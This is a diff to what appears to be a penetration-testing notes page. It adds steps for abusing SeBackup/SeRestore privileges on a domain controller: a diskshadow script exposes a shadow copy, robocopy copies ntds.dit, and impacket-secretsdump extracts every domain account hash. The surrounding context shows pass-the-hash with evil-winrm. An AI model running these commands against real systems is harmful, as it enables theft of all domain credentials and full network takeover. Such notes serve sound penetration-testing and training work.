@@ -64,3 +64,44 @@ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 ```sh
 evil-winrm -i <ip> -u "Administrator" -H "<hash>"
 ```
+
+
+
+If you're on a domain controller and notice your current user has `SeRestore` / `SeBackup` privilege, then you can access the `ntds.dit` (hashes of all domain accounts) by first:
+
+{% code title="script.txt" %}
+```
+set metadata C:\Windows\Temp\meta.cabX
+set context clientaccessibleX
+set context persistentX
+begin backupX
+add volume C: alias cdriveX
+createX
+expose %cdrive% E:X
+end backupX
+```
+{% endcode %}
+
+Storing the above in `script.txt`, then navigate to `C:\Windows\System32\`
+
+Then run the following command:
+
+```
+.\diskshadow /s C:\Users\YOURUSER\Desktop\script.txt
+```
+
+You can then access the contents of `ntds` by doing a `robocopy`
+
+{% code overflow="wrap" %}
+```
+robocopy /b E:\Windows\ntds C:\Users\YOURUSER\Desktop\ntds
+```
+{% endcode %}
+
+You can then get the hashes similarly to how you would with the SAM / SYSTEM files
+
+{% code overflow="wrap" %}
+```
+impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
+```
+{% endcode %}
